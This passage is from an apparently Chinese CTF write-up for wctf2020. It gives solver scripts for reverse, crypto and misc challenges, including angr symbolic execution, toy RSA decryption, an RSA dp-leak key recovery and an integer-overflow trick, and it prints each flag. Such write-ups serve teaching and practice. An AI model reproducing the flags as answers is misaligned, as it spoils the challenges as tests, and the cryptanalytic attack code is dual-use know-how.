class="hljs-string">&#x27;9&#x27;</span>) <span class="hljs-keyword">and</span> x &lt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) <span class="hljs-keyword">or</span> x &gt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;f&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> k1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>        tt = kaisa(dt, k1)<br>        <span class="hljs-keyword">for</span> k2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>            tt2 = xor(tt, k2)<br>            <span class="hljs-keyword">if</span> check(tt2):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(tt2))<br>                <span class="hljs-built_in">print</span>(k1, k2)<br></code></pre></td></tr></table></figure><p>解法二：IDAPython根据指令去逆向：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">def trans(xx, kk):<br>    return [(x-kk) &amp; <span class="hljs-number">0xFF</span> for x <span class="hljs-keyword">in</span> xx]<br>def <span class="hljs-keyword">xor</span>(xx, kk):<br>    return [x^kk for x <span class="hljs-keyword">in</span> xx]<br>def not_(xx):<br>    return [~x for x <span class="hljs-keyword">in</span> xx]<br><br><span class="hljs-built_in">dt</span> = [<span class="hljs-number">0xd9</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2a</span>]<br><br>ads = <span class="hljs-number">0x4005B0</span><br>end = <span class="hljs-number">0x401DC0</span><br>i = PrevHead(end)<br>while i &gt; ads:<br>    if GetMnem(i) == <span class="hljs-string">&#x27;xor&#x27;</span> <span class="hljs-keyword">and</span> GetOpnd(i, <span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;byte ptr [rdx+rax+5]&#x27;</span>:<br>        k = <span class="hljs-keyword">int</span>(GetOpnd(i, <span class="hljs-number">1</span>).rstrip(<span class="hljs-string">&#x27;h&#x27;</span>), <span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">dt</span> = <span class="hljs-keyword">xor</span>(<span class="hljs-built_in">dt</span>, k)<br>        print(<span class="hljs-string">&quot;xor: &#123;&#125;&quot;</span>.format(k))<br>    if GetMnem(i) == <span class="hljs-string">&#x27;add&#x27;</span> <span class="hljs-keyword">and</span> GetOpnd(i, <span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;byte ptr [rdx+rax+5]&#x27;</span>:<br>        k = <span class="hljs-keyword">int</span>(GetOpnd(i, <span class="hljs-number">1</span>).rstrip(<span class="hljs-string">&#x27;h&#x27;</span>), <span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">dt</span> = trans(<span class="hljs-built_in">dt</span>, k)<br>        print(<span class="hljs-string">&quot;trans: &#123;&#125;&quot;</span>.format(k))<br>    if GetMnem(i) == <span class="hljs-string">&#x27;not&#x27;</span> <span class="hljs-keyword">and</span> GetOpnd(i, <span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;byte ptr [rdx+rax+5]&#x27;</span>:<br>        <span class="hljs-built_in">dt</span> = not_(<span class="hljs-built_in">dt</span>)<br>        print(<span class="hljs-string">&quot;not: &#123;&#125;&quot;</span>.format(k))<br>    i = PrevHead(i)<br><br>print(<span class="hljs-built_in">dt</span>) <br></code></pre></td></tr></table></figure><p>解法三：符号执行工具约束求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br>p = angr.Project(<span class="hljs-string">&quot;./funre&quot;</span>, load_options=&#123;<span class="hljs-string">&quot;auto_load_libs&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br>f = p.factory<br>state = f.entry_state(addr=<span class="hljs-number">0x400605</span>)<br>flag = claripy.BVS(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-number">8</span>*<span class="hljs-number">32</span>)<br>state.memory.store(<span class="hljs-number">0x603055</span>+<span class="hljs-number">0x300</span>+<span class="hljs-number">5</span>, flag)<br>state.regs.rdx = <span class="hljs-number">0x603055</span>+<span class="hljs-number">0x300</span><br>state.regs.rdi = <span class="hljs-number">0x603055</span>+<span class="hljs-number">0x300</span>+<span class="hljs-number">5</span><br><br>sm = p.factory.simulation_manager(state)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] init ok&quot;</span>)<br><br>sm.explore(find=<span class="hljs-number">0x401DAE</span>)<br><span class="hljs-keyword">if</span> sm.found:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] found!&quot;</span>)<br>    x = sm.found[<span class="hljs-number">0</span>].solver.<span class="hljs-built_in">eval</span>(flag, cast_to=<span class="hljs-built_in">bytes</span>)<br>    <span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/30/GnNG4g.png" alt="GnNG4g.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="大数运算-55-solves"><a href="#大数运算-55-solves" class="headerlink" title="大数运算 - 55 solves"></a>大数运算 - 55 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>题目：</p><blockquote><p>flag等于 wctf2020{Part1-Part2-Part3-Part4} 每一Part都为数的十六进制形式（不需要0x)，并用 ‘-‘ 连接<br>Part1 &#x3D; <code>2020*2019*2018* ... *3*2*1</code> 的前8位<br>Part2 &#x3D; <code>520^1314 + 2333^666</code> 的前8位<br>Part3 &#x3D; 宇宙终极问题的答案 x, y, z绝对值和的前8位<br>Part4 &#x3D; 见图片附件，计算结果乘上1314</p></blockquote><p><img src="https://s1.ax1x.com/2020/03/29/GVYCUs.jpg" alt="GVYCUs.jpg"></p><p>这个就是考察萌新的 Python 能力，直接用 Python 算就可以了。</p><p>贴一下exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># part1</span><br>cnt = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2021</span>):<br>cnt *= i<br>Part1 = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(cnt)[:<span class="hljs-number">8</span>])))[<span class="hljs-number">2</span>:]<br><span class="hljs-comment"># 不要0x</span><br><br><span class="hljs-comment"># part2</span><br>cnt = <span class="hljs-number">520</span> ** <span class="hljs-number">1314</span> + <span class="hljs-number">2333</span> ** <span class="hljs-number">666</span><br>Part2 = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(cnt)[:<span class="hljs-number">8</span>])))[<span class="hljs-number">2</span>:]<br><br><span class="hljs-comment"># part3</span><br><span class="hljs-comment"># 宇宙终极问题的答案，Google一下前几条就有，取x, y, z</span><br><span class="hljs-comment"># 42 =（-80538738812075974）^3 + 80435758145817515^3 + 12602123297335631^3</span><br>cnt = <span class="hljs-number">80538738812075974</span> + <span class="hljs-number">80435758145817515</span> + <span class="hljs-number">12602123297335631</span><br>Part3 = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(cnt)[:<span class="hljs-number">8</span>])))[<span class="hljs-number">2</span>:]<br><br><span class="hljs-comment"># part4</span><br><span class="hljs-comment"># 这是定积分，比较简单，图是嫖的，算出来结果是520(怎么那么多骚东西)</span><br>cnt = <span class="hljs-number">520</span> * <span class="hljs-number">1314</span><br>Part4 = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(cnt)[:<span class="hljs-number">8</span>])))[<span class="hljs-number">2</span>:]<br><br>flag = <span class="hljs-string">&#x27;wctf2020&#123;%s-%s-%s-%s&#125;&#x27;</span> % (Part1, Part2, Part3, Part4)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="B-se-37-solves"><a href="#B-se-37-solves" class="headerlink" title="B@se - 37 solves"></a>B@se - 37 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>题目：</p><blockquote><p>JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs****kxyz012789+&#x2F;</p><p>oh holy shit, something is missing…</p></blockquote><p>换表的 base64 太常见了，做了一点点改动，全排列就24种。</p><p>密文：</p><blockquote><p>MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD&#x3D;&#x3D;</p></blockquote><p>我用了 itertools 模块，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> itertools<br><br><br><span class="hljs-comment"># 34uj</span><br>string1 = <span class="hljs-string">&quot;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs****kxyz012789+/&quot;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><br>enc = <span class="hljs-string">&#x27;MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD==&#x27;</span><br><br>miss = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string2:<br><span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> string1:<br>miss.append(i)<br><br>ob = itertools.permutations(miss, <span class="hljs-number">4</span>)<br>tb = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ob:<br>tmp = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>tmp += j<br>tb.append(tmp)<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> tb:<br>string1 = <span class="hljs-string">&quot;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs&quot;</span> + x + <span class="hljs-string">&quot;kxyz012789+/&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br><span class="hljs-keyword">if</span> i != <span class="hljs-string">&#x27;=&#x27;</span>:<br>index = string1.find(i)<br>flag += string2[index]<br><span class="hljs-keyword">else</span>:<br>flag += <span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-keyword">try</span>:<br>flag = base64.b64decode(flag).decode()<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wctf2020&#x27;</span> <span class="hljs-keyword">in</span> flag:<br><span class="hljs-built_in">print</span>(flag)<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>跑出来有一些是不可见字符，有一些是不怎么对的，但可见字符就两种情况，flag 是有意义的英文单词，所以找那个最像的就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">wctf2020&#123;bare64_!r_v2ry_e@ry_and_fuN&#125;<br>wctf2020&#123;base64_1s_v3ry_e@sy_and_fuN&#125;<br>wctf2020&#123;bare64_!r_v2ry_e@ry_and_fuN&#125;<br>wctf2020&#123;base64_1s_v3ry_e@sy_and_fuN&#125;<br>[Finished <span class="hljs-keyword">in</span> <span class="hljs-number">0.2</span>s]<br></code></pre></td></tr></table></figure><p>正解： <code>wctf2020&#123;base64_1s_v3ry_e@sy_and_fuN&#125;</code></p><h2 id="情书-32-solves"><a href="#情书-32-solves" class="headerlink" title="情书 - 32 solves"></a>情书 - 32 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>题目：</p><blockquote><p>Premise: Enumerate the alphabet by 0、1、2、…..  、25<br>Using the RSA system<br>Encryption:0156 0821 1616 0041 0140 2130 1616 0793<br>Public Key:2537 and 13<br>Private Key:2537 and 937</p><p>flag: wctf2020{Decryption}</p></blockquote><p>其实这题严格意义上也不是我出的，是朋友的男朋友之前纪念日给她的，然后求助于我来解，觉得挺有意思的就直接嫖过来了。</p><p>其实这个也有猜得出来的嫌疑，不过得搞清楚它的格式，算是非 CTFer 的脑回路吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br>d = <span class="hljs-number">937</span><br>e = <span class="hljs-number">13</span><br>n = <span class="hljs-number">2537</span><br><br>al = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><br>enc = [<span class="hljs-number">156</span>, <span class="hljs-number">821</span>, <span class="hljs-number">1616</span>, <span class="hljs-number">41</span>, <span class="hljs-number">140</span>, <span class="hljs-number">2130</span>, <span class="hljs-number">1616</span>, <span class="hljs-number">793</span>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br>result = <span class="hljs-built_in">pow</span>(i, d, n)<br>flag += al[result%<span class="hljs-number">26</span>]<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># flag = iloveu</span><br></code></pre></td></tr></table></figure><p>其实是有点坑的。。。希望不要打我</p><h2 id="佛说：只能四天-19-solves"><a href="#佛说：只能四天-19-solves" class="headerlink" title="佛说：只能四天 - 19 solves"></a>佛说：只能四天 - 19 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>标题源于微博的梗，重点在佛。</p><p>题目：</p><blockquote><p>圣经分为《旧约全书》和《新约全书》</p><p>hint1: 虽然有点不环保，但hint好像是一次性的，得到后就没有利用价值了。</p><p>hint2: 凯撒不是最后一步，by the way，凯撒为什么叫做凯撒？</p></blockquote><p>题目表述可以知道有新约与佛论禅，link：<code>http://hi.pcmoe.net/buddha.html</code></p><p>解出来全是社会主义核心价值观，link：<code>http://z.duoluosb.com/</code></p><p>再解就是 <code>RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe_doyouknowfence</code>，后面有提示 fence，也就是栅栏密码了，这里设置是栅栏4位，根据 hint1 也可以知道 <code>_doyouknowfence</code> 这一段不用放进栅栏。</p><p>解完就是 <code>R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar</code>，提示凯撒，凯撒密码最广的是移位3位，很多在线解码器默认也是3位，所以这里也是3位移位。</p><p>最后得到 <code>O5RXIZRSGAZDA63ONFPWQYLPL54GSYLOM5PXQ2LBNZTV6ZDBL53W67I</code>，全是大写字母，容易想到(才怪)base32，解一下就可以得到flag了。</p><p>flag: <code>wctf2020&#123;ni_hao_xiang_xiang_da_wo&#125;</code></p><p>出题人又是藏在床底下的一天。。。。。</p><h2 id="babyrsa-35-solves"><a href="#babyrsa-35-solves" class="headerlink" title="babyrsa - 35 solves"></a>babyrsa - 35 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>基本做过rsa的题目都懂，也是让萌新学的，题目：</p><blockquote><p>c &#x3D; 28767758880940662779934612526152562406674613203406706867456395986985664083182<br>n &#x3D; 73069886771625642807435783661014062604264768481735145873508846925735521695159<br>e &#x3D; 65537</p></blockquote><p>给出了，n，e，c，而且n很小，拿去 <a href="http://www.factordb.com/">http://www.factordb.com/</a> 解一下就可以得到 p，q，接下来就是常规解法了。</p><p>这是 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><br>n = <span class="hljs-number">73069886771625642807435783661014062604264768481735145873508846925735521695159</span><br>e = <span class="hljs-number">65537</span><br>p = <span class="hljs-number">386123125371923651191219869811293586459</span><br>q = <span class="hljs-number">189239861511125143212536989589123569301</span><br><br>d = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br><span class="hljs-comment"># wctf2020&#123;just_@_piece_0f_cak3&#125;</span><br></code></pre></td></tr></table></figure><p>萌新们要是碰到模块安装的问题也可以去我博客翻翻，闲得没事干的时候整理的。</p><h2 id="leak-16-solves"><a href="#leak-16-solves" class="headerlink" title="leak - 16 solves"></a>leak - 16 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>这题是 dp 泄露，题目：</p><blockquote><p>e &#x3D; 65537<br>n &#x3D; 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847<br>c &#x3D; 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869<br>dp &#x3D; 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</p></blockquote><p>具体原理可以参考一下 <a href="https://www.dazhuanlan.com/2019/10/04/5d970ff4a37c5/">RSA常见攻击方法</a>，<a href="https://www.jianshu.com/p/74270dc7a14b">RSA之拒绝套路</a></p><p>这里只给 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847</span><br>c = <span class="hljs-number">108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869</span><br>dp = <span class="hljs-number">734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, e):<br><span class="hljs-keyword">if</span> (dp*e-<span class="hljs-number">1</span>) % i == <span class="hljs-number">0</span>:<br>p = (dp*e-<span class="hljs-number">1</span>)//i + <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>q = n // p<br>d = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br>exit()<br><span class="hljs-comment"># wctf2020&#123;dp_leaking_1s_very_d@angerous&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="比赛规则-149-solves"><a href="#比赛规则-149-solves" class="headerlink" title="比赛规则 - 149 solves"></a>比赛规则 - 149 solves</h2><p>看规则交 flag，网页直接复制，不多说。</p><h2 id="Welcome-51-solves"><a href="#Welcome-51-solves" class="headerlink" title="Welcome - 51 solves"></a>Welcome - 51 solves</h2><p>题目：</p><blockquote><p>《论语》：三人行，必有我师焉。</p></blockquote><p>这是2019年国赛的签到题，提取出来改个flag。题目提示是三人行，所以三个人头就能拿flag了。当然出题人在测试的时手机打开两个人头一起来测试就可以。。。当然，其实只要是个圆形就能识别。后来又出现了空气中突然出现个圆，细思极恐。。</p><p>看了一些选手 wp 的各种截图，比如拿 tfboys 的，一个人头三个圈的。。。出题人要笑岔气了哈哈哈哈哈哈</p><h2 id="Space-Club-57-solves"><a href="#Space-Club-57-solves" class="headerlink" title="Space Club - 57 solves"></a>Space Club - 57 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>这个算是比较常规的 misc 了，txt 里全是空格，但是长度不一样，ctrl + A 就是惊喜，那我们猜测代表为0，1。</p><p>接下来脚本一跑，什么都有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-comment">#encoding=utf-8</span><br><span class="hljs-keyword">import</span> libnum<br>binary = []<br>tmp = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;space.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).readlines():<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(x.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)) == <span class="hljs-number">6</span>:<br>tmp += <span class="hljs-string">&#x27;0&#x27;</span><br><span class="hljs-keyword">else</span>:<br>tmp += <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) == <span class="hljs-number">8</span>:<br>binary.append(tmp)<br>tmp = <span class="hljs-string">&#x27;&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> binary:<br>flag += libnum.b2s(i)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># wctf2020&#123;h3re_1s_y0ur_fl@g_s1x_s1x_s1x&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Shop-18-solves"><a href="#Shop-18-solves" class="headerlink" title="Shop - 18 solves"></a>Shop - 18 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p><img src="https://s1.ax1x.com/2020/03/30/GuCnK0.jpg" alt="GuCnK0.jpg"></p><p>这题其实是 picoCTF 2019 魔改过来的题，考察点是<strong>整数溢出</strong>，本来想着放个 hint 说一说是32位还是64，但是大家都很强。。。全都秒了，不过随便输入123456789也完事了，这里是 int 32。</p><p><img src="https://s1.ax1x.com/2020/03/30/GuCevq.jpg" alt="GuCevq.jpg"></p><p>占4个字节  -2147483648 ~ 2147483647。</p><p>有钱就买买买：</p><p><img src="https://s1.ax1x.com/2020/03/30/GuCZ2n.jpg" alt="GuCZ2n.jpg"></p><h2 id="find-me-30-solves"><a href="#find-me-30-solves" class="headerlink" title="find me - 30 solves"></a>find me - 30 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>这题是我最初打CTF时在属性里找到flag，本来想用来做签到的(怎么全部是签到)，但是看大家做得好猛，就随便找了个盲文在线网站丢进去了。。。</p><p>解题思路：右键 -&gt; 属性 -&gt; 详细信息，把盲文复制，在线工具跑，得flag。</p><p>参考工具：<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">link</a></p><h2 id="girlfriend-24-solves"><a href="#girlfriend-24-solves" class="headerlink" title="girlfriend - 24 solves"></a>girlfriend - 24 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>这题原本我是想用拨号键弹奏千里之外，让大家把数字弄出来base64一下，但好像非常憨，为了不被打，改成了九键键盘。很多师傅一开始联想到了 Morse，好像也有点道理。。。</p><p>我想起来以前刚开始打CTF的时候，跟学长打俄罗斯的比赛，我硬是听了一晚上没听出来，后知后觉才发现有 <code>dtmf-decoder</code>这种东西。</p><p>这里跑一遍就可以得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">999</span>*<span class="hljs-number">666</span>*<span class="hljs-number">88</span>*<span class="hljs-number">2</span>*<span class="hljs-number">777</span>*<span class="hljs-number">33</span>*<span class="hljs-number">6</span>*<span class="hljs-number">999</span>*<span class="hljs-number">4</span>*<span class="hljs-number">444</span>*<span class="hljs-number">777</span>*<span class="hljs-number">555</span>*<span 